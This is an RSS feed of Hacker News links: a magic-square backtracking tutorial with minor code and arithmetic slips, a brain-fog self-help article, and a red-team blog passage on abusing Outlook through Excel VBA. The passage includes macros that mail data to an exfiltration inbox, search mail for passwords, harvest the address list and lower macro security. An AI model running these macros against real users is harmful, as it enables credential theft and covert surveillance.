</p><p>Get all Tom 7 thingos at ‚Üí [<a href="http://tom7.org/">tom7.org</a>]</p>

</div></div></div>]]>
            </description>
            <link>http://tom7.org/abc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127161</guid>
            <pubDate>Sat, 13 Feb 2021 21:34:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Bestsnip ‚Äì Draw animations online with automatic inbetweening]]>
            </title>
            <description>
<![CDATA[
Score 61 | Comments 24 (<a href="https://news.ycombinator.com/item?id=26126906">thread link</a>) | @nevernothing
<br/>
February 13, 2021 | https://bestsnip.com/animation/ | <a href="https://web.archive.org/web/*/https://bestsnip.com/animation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://bestsnip.com/animation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126906</guid>
            <pubDate>Sat, 13 Feb 2021 21:05:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Solving Magic Squares Using Backtracking]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 9 (<a href="https://news.ycombinator.com/item?id=26126652">thread link</a>) | @jpskycak
<br/>
February 13, 2021 | http://www.eurisko.us/solving-magic-squares-using-backtracking/ | <a href="https://web.archive.org/web/*/http://www.eurisko.us/solving-magic-squares-using-backtracking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><header><!--<p class="page__meta"><i class="fa fa-clock-o" aria-hidden="true"></i> 12 minute read</p>--> <!--<p class="page__meta"><time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p>--><p>By <a target="_blank" href="https://eurisko-us.github.io/elijah-tarr">Elijah Tarr</a> on <time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p><!--<p class="page__date"><strong><i class="fa fa-fw fa-calendar" aria-hidden="true"></i> Published:</strong> <time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p>--></header><section itemprop="text"><div><p>A magic square can be thought of as a matrix with specific rows, columns, and diagonals adding up to the same number, called the magic constant. For an $n \times n$ magic square, the magic constant is</p><center> $\begin{align*} \dfrac{1}{n} \sum_{k=1}^{n^2} k \end{align*}$ </center><p>For example, a magic square with dimensions $3 \times 3$ would have magic constant $15,$ and dimensions $4 \times 4$ would have magic constant $34.$</p><p>To solve a magic square, we must fill in each element with a number in ${1, 2, \ldots, n^2 },$ and each number must appear exactly once. A $3 \times 3$ magic square could look like this:</p><center> $\begin{align*} \begin{bmatrix} 2 &amp; 7 &amp; 6 \\ 9 &amp; 5 &amp; 1 \\ 4 &amp; 3 &amp; 8 \end{bmatrix} \end{align*}$ </center><p>Or this:</p><center> $\begin{align*} \begin{bmatrix} 8 &amp; 3 &amp; 4 \\ 1 &amp; 5 &amp; 9 \\ 6 &amp; 7 &amp; 2 \end{bmatrix} \end{align*}$ </center><p>It may seem like a $3 \times 3$ magic square can have multiple solutions. But looking closer allows us to see that the two matrices above are actually both the same configuration. The second matrix is just the first matrix rotated $180$ degrees. In general, rotating and flipping a magic square in any direction will still yield a valid magic square.</p><h2>Solving a Magic Square Using Brute Force</h2><p>How can we build a program to construct one of these magic squares?</p><p>Just like every problem, the simplest way to solve a magic square is to use brute force. It will be the most inefficient solution we can think of, but it will give us some grounding to see which areas we need to improve it in. To get some code down, we can write something like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>():
    <span>for</span> x1 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
        <span>for</span> x2 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
            <span>for</span> x3 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                <span>for</span> x4 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                    <span>for</span> x5 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                        <span>for</span> x6 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                            <span>for</span> x7 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                <span>for</span> x8 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                    <span>for</span> x9 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                        square <span>=</span> [[x1, x2, x3],
                                                  [x4, x5, x6],
                                                  [x7, x8, x9]]
                                        <span>if</span> is_valid(square, <span>15</span>):
                                            <span>return</span> square
</pre></div></span></p><p>The classic $9$-nested-for-loop approach. It is quite inefficient, but it will do the job. Each $x_k$ variable represents a space in the square. There are 9 spaces, so we nest $9$ loops, $1$ for each space. Each loop will loop through all the possible numbers in that space, $1$ through $9.$</p><p>To write the <code>is_valid</code> function, we need to check for duplicate values, which can easily be done with the use of a set. Then we have to check if each row, column, and diagonal adds up to a certain number, so we can just make a list of all those and check if they are equal to $15$ at the end.</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>is_valid</span>(square, n):
    vals <span>=</span> [entry <span>for</span> row <span>in</span> square <span>for</span> entry <span>in</span> row <span>if</span> entry <span>!=</span> <span>None</span>]
    <span>if</span> <span>len</span>(<span>set</span>(vals)) <span>&lt;</span> <span>len</span>(vals): <span># check for duplicates</span>
        <span>return</span> <span>False</span>
        
    num_rows <span>=</span> <span>len</span>(square)
    arrs <span>=</span> square \ <span># rows</span>
        <span>+</span> [<span>list</span>(arr) <span>for</span> arr <span>in</span> <span>zip</span>(<span>*</span>square)] \ <span># columns</span>
        <span>+</span> [square[i][i] <span>for</span> i <span>in</span> <span>range</span>(<span>len</span>(square))] <span># main diagonal</span>
        <span>+</span> [square[i][num_rows<span>-</span>i<span>-</span><span>1</span>] <span>for</span> i <span>in</span> <span>range</span>(num_rows)] <span># anti-diagonal</span>
        
    <span>return</span> <span>all</span>(<span>sum</span>(arr) <span>==</span> n <span>for</span> arr <span>in</span> arrs <span>if</span> <span>None</span> <span>not</span> <span>in</span> r)
</pre></div></span></p><p>Because I want this function to be able to run on squares larger than just $3 \times 3,$ I pass in the constant as $n$. For a $3 \times 3$ square, we would set $n=15.$ For a $4 \times 4$ square, we would set $n=34.$</p><h2>Brute Force Takes Forever!</h2><p>Let‚Äôs talk about timing. We have $9$ nested for loops, and the <code>is_valid</code> operation is in the deepest one. Since each loop is going to run $9$ times to test each number $1-9$ in each element of the square, it‚Äôs going to run the <code>is_valid</code> function $9^9$ times, which is absolutely insane.</p><p>Using Python‚Äôs <code>timeit</code> module, we can see how long the <code>is_valid</code> function takes to run:</p><ul><li>$1.6 \, \mu\textrm{s}$ to run if there are duplicate values</li><li>$5.3 \, \mu\textrm{s}$ to run if there are no duplicate values</li><li>$6.3 \, \mu\textrm{s}$ to run if the square is valid</li></ul><p>With this brute force algorithm, we can expect that the vast majority of iterations are going to have duplicate values in them. So, I‚Äôll be generous and say that each time it runs, $1.6 \, \mu\textrm{s}$ pass. That means the amount of time it takes is $9^9 \times 1.6 \textrm{ usecs} \sim 10.3 \textrm{ minutes}.$</p><p>What if we wanted a $4 \times 4$ magic square? Well, we can use the equation again: $16^{16} \times 1.6 \mu\textrm{s} \sim \textbf{600 millennia}.$ It‚Äôs very unlikely that the human race will even exist for that long; we might have destroyed the earth along with the computer that was running this algorithm by then. We need to write a more efficient algorithm.</p><h2>Backtracking</h2><p>The problem with brute force is that it spends too much time looking through solutions that will never work. For example, the algorithm starts out with the square</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 1 \end{bmatrix}, \end{align*}$ </center><p>and then advances to</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 2 \end{bmatrix}, \end{align*}$ </center><p>and then</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 3 \end{bmatrix}. \end{align*}$ </center><p>There‚Äôs absolutely no point in checking any square with the first $3$ numbers as $1$ because we‚Äôre not allowed to have duplicates.</p><p>To avoid configurations like $1,1,1$ as the top row, we can use a technique called <b>backtracking</b>. Whenever we reach a configuration that won‚Äôt work, we ‚Äúbacktrack‚Äù and skip over that configuration instead of wasting tons of time modifying it in ways that will never make it valid.</p><p>Using backtracking, we would skip over all configurations that have duplicates, and instead start out with</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 2 &amp; 3\\ 4 &amp; 5 &amp; 6 \\ 7 &amp; 8 &amp; 9 \end{bmatrix}. \end{align*}$ </center><p>To implement backtracking, we‚Äôll start by skipping over configurations with duplicates. In each for loop, before entering the next loop, we will check if the number has been duplicated anywhere. We will only check the rest of the square if the number isn‚Äôt duplicated. Implementing this, we end up with the following code:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>()
    <span>for</span> x1 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
        <span>for</span> x2 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
            <span>if</span> x2 <span>in</span> [x1]:
                <span>continue</span>
            <span>for</span> x3 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                <span>if</span> x3 <span>in</span> [x1, x2]:
                    <span>continue</span>
                <span>for</span> x4 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                    <span>if</span> x4 <span>in</span> [x1, x2, x3]:
                        <span>continue</span>
                    <span>for</span> x5 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                        <span>if</span> x5 <span>in</span> [x1, x2, x3, x4]:
                            <span>continue</span>
                        <span>for</span> x6 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                            <span>if</span> x6 <span>in</span> [x1, x2, x3, x4, x5]:
                                <span>continue</span>
                            <span>for</span> x7 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                <span>if</span> x7 <span>in</span> [x1, x2, x3, x4, x5, x6]:
                                    <span>continue</span>
                                <span>for</span> x8 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                    <span>if</span> x8 <span>in</span> [x1, x2, x3, x4, x5, x6, x7]:
                                        <span>continue</span>
                                    <span>for</span> x9 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                        <span>if</span> x9 <span>in</span> [x1, x2, x3, x4, x5, x6, x7, x8]:
                                            <span>continue</span>
                                        square <span>=</span> [[x1, x2, x3],
                                                  [x4, x5, x6],
                                                  [x7, x8, x9]]
                                        <span>if</span> is_valid(square, <span>15</span>):
                                            <span>return</span> square
</pre></div></span></p><p>Once we run this code, we notice a massive improvement in performance! Within only a couple of seconds, our algorithm actually finds multiple squares.</p><p>With this new algorithm, we skip all squares which repeat numbers, which will always be invalid. So, we are looping through all permutations. We can expect to run the validation function about $P(10, 9) = 3,628,800$ times, which is much less than the $9^9$ times we had to check last time.</p><p>Now, this method speeds up our code, but by how much? Theoretically, it takes $P(10, 9) * 1.6 \mu\textrm{s} \sim 5.8 \mu\textrm{s}$ to just run all the validations. (We introduced a bunch of ‚Äòif‚Äô statements in between each of the for loops, so it will take a bit longer in reality.) But the point is, our new algorithm works $10,600\%$ faster than the old one!</p><h2>Using a While Loop</h2><p>Still, we have another problem left, and that is the quality of the code. No one wants to have to look at a cascading abyss of for loops and if statements while writing their code, so let‚Äôs see if we can combine all this into a single while loop.</p><p>If you think about it, we can treat the square as a list of numbers instead of a list of rows. Instead of $[[1, 2, 3], [4, 5, 6], [7, 8, 9]],$ we can store the array as $[1, 2, 3, 4, 5, 6, 7, 8, 9].$ Now, that means we will need a function to convert the flat list into a square:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>arr_to_square</span>(arr):
    side_length <span>=</span> <span>int</span>(<span>len</span>(arr) <span>**</span> <span>0.5</span>)
    <span>return</span> [arr[i:i<span>+</span>side_length] <span>for</span> i <span>in</span> <span>range</span>(<span>0</span>, <span>len</span>(arr), side_length)]
</pre></div></span></p><p>Now, let‚Äôs think of how we can structure the while loop. We want the loop to keep going until both the value None is nowhere to be found in the list, and the square is valid. We can use the <code>or</code> operator to run the loop if <code>None</code> is in the square, or the square isn‚Äôt valid, like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>(size):
    n <span>=</span> get_magic_const(size)
    square <span>=</span> [<span>None</span> <span>for</span> i <span>in</span> <span>range</span>(size<span>**</span><span>2</span>)]
    
    <span>while</span> <span>None</span> <span>in</span> square <span>or</span> <span>not</span> is_valid(arr_to_square(square), n):
        <span>pass</span>
        
    <span>return</span> arr_to_square(square)
</pre></div></span></p><p>You‚Äôll notice I use the function <code>get_magic_const</code>, which computes the magic constant, like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>get_magic_const</span>(side_length):
    <span>return</span> side_length<span>*</span>(side_length<span>**</span><span>2</span><span>+</span><span>1</span>)<span>/</span><span>2</span>
</pre></div></span></p><p>We will need a variable to store the index of the ‚Ä¶</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.eurisko.us/solving-magic-squares-using-backtracking/">http://www.eurisko.us/solving-magic-squares-using-backtracking/</a></em></p>]]>
            </description>
            <link>http://www.eurisko.us/solving-magic-squares-using-backtracking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126652</guid>
            <pubDate>Sat, 13 Feb 2021 20:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strategies to Reduce Brain Fog and Improve Clear Thinking]]>
            </title>
            <description>
<![CDATA[
Score 92 | Comments 93 (<a href="https://news.ycombinator.com/item?id=26126401">thread link</a>) | @evo_9
<br/>
February 13, 2021 | https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/ | <a href="https://web.archive.org/web/*/https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><div><hr>
<p>Mental fog is often described as a ‚Äúcloudy-headed‚Äù feeling.</p>
<p>Common conditions of brain fog include poor memory, difficulty focusing or concentrating, and struggling with articulation.</p>
<p>Imagine if you could concentrate your brain power into one bright beam and focus it like a laser on whatever you wish to accomplish.</p>
<p>Many people struggle to concentrate. And when you can‚Äôt concentrate, everything you do is harder and takes longer than you‚Äôd like.</p>
<h3><strong>Give up the&nbsp;clutter</strong></h3>
<p>Mess creates stress.</p>
<p>There‚Äôs a strong link between your physical space and your mental space.</p>
<p>Clutter is bad for your mind and health. It can create long-term, low-level anxiety.</p>
<p>When the book, <a rel="nofollow" href="https://amzn.to/2tvOPr0" data-href="http://amzn.to/2tvOPr0" target="_blank"><em>The Japanese Art of Reorganizing and Decluttering</em></a><em>,</em> by Marie Condo became a best-seller, it wasn‚Äôt too surprising.</p>
<p>We are all looking for ways to create more meaningful lives with less to distract us.</p>
<blockquote><p><strong><em>Get rid of clutter at your office, on your desk, in your room, and you will send a clear message of calm directly to your brain.</em></strong></p></blockquote>
<p>Start decluttering today in small, focused bursts. You‚Äôre not going to clean up your entire space in a day, so start small to make it a daily habit that sticks.</p>
<p>Set yourself up for success by making a plan and targeting specific areas you‚Äôre going to declutter, clean up, and organize over a prolonged period of time.</p>
<h3>Multi-tasking doesn‚Äôt&nbsp;work</h3>
<p>The ability to multi-task is a false badge of honor.</p>
<p>Task switching has a severe cost.</p>
<p>Your concentration suffers when you multitask.</p>
<p>It compromises how much actual time you spend doing productive work, because you‚Äôre continually unloading and reloading the hippocampus/short term memory.</p>
<p>Research shows that tasks switching actually burns more calories and fatigues your brain ‚Äì reducing your overall capacity for productive thought and work.</p>
<p>Commit to completing one task at a time.</p>
<p>Remove potential distractions (like silencing your mobile, turning off email alerts ) before you start deep work to avoid the temptation to switch between tasks.</p>
<p><strong>Use the 3-to-1 method!</strong></p>
<p>Narrow down your most important tasks to 3, and then give one task your undivided attention for a period of time.</p>
<p>Allow yourself to rotate between the three, giving yourself a good balance of singular focus and variety.</p>
<h3>Give up the urgent distraction</h3>
<p>Disconnect. Your productivity, creativity and next big idea depends on it.</p>
<p>Urgency wrecks productivity. Urgent but unimportant tasks are major distractions.</p>
<p>Last-minute distractions are not necessarily priorities.</p>
<p>Sometimes important tasks stare you right in the face, but you neglect them and respond to urgent but unimportant things.</p>
<p>You need to reverse that. It‚Äôs one the only ways to master your time.</p>
<blockquote><p><strong><em>Your ability to distinguish urgent and important tasks has a lot to do with your success.</em></strong></p></blockquote>
<p>Important tasks are things that contribute to your long-term mission, values, and goals. Separating these differences is simple enough to do once, but doing so continually can be tough.</p>
<h3>Stop feeding your&nbsp;comfort</h3>
<p>Comfort provides a state of mental security.</p>
<p>When you‚Äôre comfortable and life is good, your brain can release chemicals like dopamine and serotonin, which lead to happy feelings.</p>
<p>But in the long-term, comfort is bad for your brain.</p>
<blockquote><p><strong><em>Without mental stimulation dendrites, connections between brain neurons that keep information flowing, shrink or disappear altogether.</em></strong></p></blockquote>
<p>An active life increases dendrite networks and also increase the brain‚Äôs regenerating capacity, known as plasticity.</p>
<p>‚ÄúNeglect of intense learning leads plasticity systems to waste away,‚Äù says Norman Doidge in his book, <a rel="nofollow" href="https://amzn.to/2Fnh3to" data-href="http://amzn.to/2Fnh3to" target="_blank">The Brain That Changes Itself</a>.</p>
<p>Michael Merzenich, a pioneer of plasticity research, and author of <a rel="nofollow" href="https://amzn.to/2oXkPj3" data-href="http://amzn.to/2oXkPj3" target="_blank">Soft-wired: How the New Science of Brain Plasticity Can Change Your Life</a> says that going beyond the familiar is essential to brain health.</p>
<p>‚ÄúIt‚Äôs the willingness to leave the comfort zone that is the key to keeping the brain new,‚Äù he says.</p>
<p>Seeking new experiences, learning new skills, and opening the door to new ideas inspire us and educate us in a way improves mental clarity.</p>
<h3>Don‚Äôt sit&nbsp;still</h3>
<p>Sitting still all day, every day, is dangerous.</p>
<p>Love it or hate it, physical activity can have potent effects on your brain and mood.</p>
<blockquote><p><strong><em>The brain is often described as being ‚Äúlike a muscle‚Äù. Its needs to be exercised for better performance.</em></strong></p></blockquote>
<p>Research shows that moving your body can improve your cognitive function.</p>
<p>30‚Äì45 minutes of brisk walking, three times a week, can help fend off the mental wear and tear.</p>
<p>What you do with your body impinges on your mental faculties.</p>
<p>Find something you enjoy, then get up and do it. And most importantly, make it a habit.</p>
<h3>Stop consuming media and start creating&nbsp;instead</h3>
<p>It‚Äôs extremely easy to consume content.</p>
<p>You are passive. Even relaxed.</p>
<p>But for each piece of unlimited content you consume, it stops a piece of content you could have created.</p>
<p>Limit your mass media consumption.</p>
<p>Embrace the creation habit.</p>
<p>Start paying attention to the noise that you let seep into your eyes and ears.</p>
<p>Ask, Is this benefitting my life in any way?</p>
<p>Does all this information make me more prone to act?</p>
<p>Does it really make me more efficient? Does it move me forward in any significant way?</p>
<p><strong>Let creation determine consumption.</strong></p>
<p>Allow curiosity to lead you to discover and pursue something you deepy care about. Make time to create something unique.</p>
<p>The point is to get lost in awe and wonder like you did when you were a child. When you achieve that feeling from a certain activity, keep doing it!</p>
<p>Share your authentic self with the rest of us.</p>
<h4>Before you&nbsp;go‚Ä¶</h4>
<p>If you enjoyed this post, you will love <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Postanly Weekly</a> (my free digest of the best productivity, behaviour change, and neuroscience posts). <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Subscribe</a> and get a free copy of my new book, ‚Äú<em>The Power of One Percent Better: Small Gains, Maximum Results‚Äù. </em>Join over 40,000 people on a mission to build a better life.</p>
<p><em>Originally published at <a rel="nofollow" href="https://medium.com/personal-growth/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately-1bfee44f4dd7">medium.com</a></em></p>
</div></div></div>]]>
            </description>
            <link>https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126401</guid>
            <pubDate>Sat, 13 Feb 2021 20:16:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The worst of the two worlds: Excel meets Outlook]]>
            </title>
            <description>
<![CDATA[
Score 267 | Comments 236 (<a href="https://news.ycombinator.com/item?id=26126067">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://adepts.of0x.cc/vba-outlook/ | <a href="https://web.archive.org/web/*/https://adepts.of0x.cc/vba-outlook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>Dear Fell<strong>owl</strong>ship, today‚Äôs homily is the last chapter of our trilogy about our epistolary-daemonic relationship with VBA. This time we are going to talk about how to interact with Outlook from Excel using macros, and also we are going to release a <strong>PoC where we turn Outlook into a keylogger</strong>. Please, take a seat and listen to the story.</p>  <p><em>We promise this is the last time <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a> will publish about VBA. We have scheduled an exorcism this weekend to release his daemons, so he can write again about vulnerabilities and other stuff different to VBA.</em></p>  <p>In our first chapter we talked about the concept of <a href="https://adepts.of0x.cc/kerberoast-vba-macro/">‚ÄúHacking in a epistolary way‚Äù</a>, where we started to implement attacks and TTPs directly in VBA macros avoiding process injections, dropping binaries or calling external programs that are flagged (like Powershell). This time we are going to shift our focus to Outlook.</p> <p>First of all we have to say that you can interact with Outlook directly from other Microsoft Office apps via VBA using the object <code>Outlook.Application</code>. This means that we can abuse Outlook functionalities from within Excel, so we can look for confidential information inside the inbox or we can exfiltrate data via mails. To send a mail only a few lines are needed:</p> <div><div><pre><code><span>'https://docs.microsoft.com/es-es/office/vba/api/outlook.namespace</span>
<span>Sub</span> <span>send_mail_example</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>xOutApp</span><span>.</span><span>CreateItem</span><span>(</span><span>0</span><span>)</span>
    <span>xMailBody</span> <span>=</span> <span>"You did it!"</span>
    <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>
    <span>With</span> <span>xOutMail</span>
        <span>.</span><span>To</span> <span>=</span> <span>"exfiltration.inbox@not-phising.cc"</span>
        <span>.</span><span>CC</span> <span>=</span> <span>""</span>
        <span>.</span><span>BCC</span> <span>=</span> <span>""</span>
        <span>.</span><span>Subject</span> <span>=</span> <span>"Macro executed "</span> <span>&amp;</span> <span>Environ</span><span>(</span><span>"username"</span><span>)</span>
        <span>.</span><span>Body</span> <span>=</span> <span>xMailBody</span>
        <span>.</span><span>Send</span>  
    <span>End</span> <span>With</span>
    <span>On</span> <span>Error</span> <span>GoTo</span> <span>0</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>If we do not want a copy in the ‚ÄúSent‚Äù folder we can set the property <code>DeleteAfterSubmit</code> as <em>True</em> after we set the <code>Body</code>. This will move directly the mail to the Deleted folder, so it is a bit more stealthy. To fully erradicate the mail we need to locate the mail (as item) inside the Deleted folder and then call the method <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.items.remove"><code>Remove</code></a> via MAPI.</p>  <p>The object <code>Outlook.Application</code> gives us also access to the namespace <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.application.getnamespace">MAPI</a> and all its methods. This is important because we can interact with the mail boxes without knowing the credentials. For example, we can use our macro to search all the received mails that contains the word ‚Äúpassword‚Äù in its body:</p> <div><div><pre><code><span>Sub</span> <span>retrieve_passwords</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>

    <span>Set</span> <span>myTasks</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetDefaultFolder</span><span>(</span><span>6</span><span>).</span><span>Items</span>
    <span>Dim</span> <span>i</span> <span>As</span> <span>Integer</span>
    <span>i</span> <span>=</span> <span>1</span>
    <span>For</span> <span>Each</span> <span>olMail</span> <span>In</span> <span>myTasks</span>
        <span>If</span> <span>(</span><span>InStr</span><span>(</span><span>1</span><span>,</span> <span>UCase</span><span>(</span><span>olMail</span><span>.</span><span>Body</span><span>),</span> <span>"PASSWORD"</span><span>,</span> <span>vbTextCompare</span><span>)</span> <span>&gt;</span> <span>0</span><span>)</span> <span>Then</span>
            <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>olMail</span><span>.</span><span>Body</span> <span>' Here we are just showing the info in the Excel sheets, but you can exfiltrate it as we saw before ;D</span>
            <span>i</span> <span>=</span> <span>i</span> <span>+</span> <span>1</span>
        <span>End</span> <span>If</span>
    <span>Next</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>Plaintext passwords inside mailboxes are probably one of the most common sins we are used to see in our engagements. A macro of this kind aimed to the right target can give you the Heaven‚Äôs keys.</p> <p>Another interesting information that we can get using MAPI is the Global Address List (GAL). In the address list we can find names, usernames, phone numbers, etc. Here we are just collecting usernames:</p> <div><div><pre><code><span>'https://www.excelcise.org/extract-outlook-global-address-list-details-with-vba/</span>
<span>Sub</span> <span>global_address_list</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>
    <span>Set</span> <span>outlGAL</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetGlobalAddressList</span><span>()</span>
    <span>Set</span> <span>outlEntry</span> <span>=</span> <span>outlGAL</span><span>.</span><span>AddressEntries</span>
        <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>

    <span>'loop through address entries and extract details</span>
    <span>For</span> <span>i</span> <span>=</span> <span>1</span> <span>To</span> <span>outlEntry</span><span>.</span><span>Count</span>
        <span>Set</span> <span>outlMember</span> <span>=</span> <span>outlEntry</span><span>.</span><span>Item</span><span>(</span><span>i</span><span>)</span>
        <span>If</span> <span>outlMember</span><span>.</span><span>AddressEntryUserType</span> <span>=</span> <span>olExchangeUserAddressEntry</span> <span>Then</span>
           <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>outlMember</span><span>.</span><span>GetExchangeUser</span><span>.</span><span>Name</span>  
        <span>End</span> <span>If</span>
    <span>Next</span> <span>i</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>The main issue is that retrieving this information <strong>can take a really long time</strong> if the company is big (we are talking about ~5-10 minutes), so it is a bit unpractical to be used in a real scenario. However both approaches can be executed <strong>inside</strong> Outlook via OTM files as we will see below.</p>  <p>In the last years various persistence methods related to Outlook were released and implemented in the tool <strong><a href="https://github.com/sensepost/ruler">Ruler</a></strong>. These methods were based on the execution of VBA code via <a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/">Custom Forms</a> and <a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/">Home Pages</a>. Both attacks are now patched, so we have to move forward.</p> <p>Recently <a href="https://twitter.com/domchell">Dominic Chell</a> published the article <a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a> where the persistence is achieved dropping a <strong>VbaProject.OTM</strong> file that is later loaded by Outlook. This is the path that we choosed here. But instead of using a payload to get a shell or parasite a process with our C2, we are going to create a keylogger in pure VBA <strong>:)</strong>.</p> <p>Outlook is one of the long term alive programs in an average office computer. It is launched since the workday beginning and is not closed until the worker leaves the office, so makes sense to use it as a keylogger. The plan is quite simple: we need to build an Excel file that modifies the registry (so Outlook can execute macros freely) and drops the OTM file with our keylogger.</p> <p>As the registry key is under <code>HKEY_CURRENT_USER</code> we do not need special privileges to modify the value (by default it is set at level 3 <em>Notifications for digitally signed macros, all other macros disabled</em>) so we enable the load and execution of macros by changing the value to 1 (<em>Enable all Macros</em>):</p> <div><div><pre><code><span>Sub</span> <span>disable_macro_security</span><span>()</span>
  <span>Dim</span> <span>myWS</span> <span>As</span> <span>Object</span>
